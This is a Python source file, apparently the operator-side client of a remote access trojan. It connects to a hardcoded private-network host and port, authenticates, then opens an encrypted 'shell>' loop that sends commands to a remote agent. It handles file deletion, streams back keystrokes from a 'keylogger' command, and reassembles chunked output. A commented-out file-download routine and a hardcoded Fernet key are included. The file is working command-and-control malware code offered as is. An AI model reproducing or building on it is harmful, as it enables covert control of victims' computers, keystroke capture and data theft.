import socket
import base64
from cryptography.fernet import Fernet


key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
cipher = Fernet(key)

def encode64(data):
    return cipher.encrypt(data)

def decode64(data):
    return cipher.decrypt(data)

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

conn.connect(('192.168.50.200',22222))

print(decode64(conn.recv(1024)).decode(), end="")
conn.send(encode64(input().encode()))
print(decode64(conn.recv(1024)).decode(), end="")
conn.send(encode64(input().encode()))

response = decode64(conn.recv(1024)).decode()
print(response)
if "failed" in response:
    conn.close()
    exit()



while 1:
    try:
        payload = input("shell> ")
        if "del" in payload:
            conn.sendall(encode64(payload.encode()))
            result = decode64(conn.recv(1024))
            print(result.decode())
        elif "keylogger" in payload:
            conn.sendall(encode64(payload.encode()))
            while 1:
                result = decode64(conn.recv(1024))
                if result.decode() != "Done":
                    print(result.decode().strip())
                else:
                    break
        else:
            conn.sendall(encode64(payload.encode()))
            len_chunks = decode64(conn.recv(1024)).decode()
            print(f"Chunks coming: {len_chunks}")
            full_encrypted_data = b''
            for i in range(int(len_chunks)):
                chunk =conn.recv(1024)
                full_encrypted_data += chunk
                # if "download" in payload:
                #     file_name = payload.split(" ")
                #     with open(f"./{file_name[1]}","ab") as file:
                #         file.write(chunk)
            try:
                decrypted_data = decode64(full_encrypted_data).decode()
                print(decrypted_data)
            except Exception as e:
                print(f"Error decrypting data: {e}")
    except KeyboardInterrupt:
        print("\nClosing connection")
        conn.sendall(encode64(b'close'))
        break

conn.close()

